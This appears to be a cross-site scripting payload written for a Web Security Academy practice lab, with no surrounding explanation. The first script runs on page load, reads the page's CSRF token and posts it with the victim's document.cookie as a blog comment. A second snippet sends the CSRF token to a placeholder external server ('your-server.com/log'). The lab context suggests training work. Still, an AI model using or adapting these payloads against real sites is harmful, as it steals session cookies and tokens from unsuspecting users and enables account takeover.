window.onload = function() {
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://0a130066037fc21783b19229006f00f6.web-security-academy.net/post/comment", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

var csrfToken = document.querySelector('input[name="csrf"]').value; // This token value can change, ensure you get the right value dynamically if needed.
var body = "csrf=" + encodeURIComponent(csrfToken) +
           "&postId=3" +
           "&comment=" + encodeURIComponent(csrfToken + document.cookie) + 
           "&name=test" +
           "&email=s%40g" +
           "&website=https%3A%2F%2Ff.com";

// Send the request
xhr.send(body);
}



```helper
  // Get the CSRF token from the input field
  var csrfToken = document.querySelector('input[name="csrf"]').value;

  // Send the CSRF token to an external server
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://your-server.com/log?token=" + csrfToken, true);
  xhr.send();
```
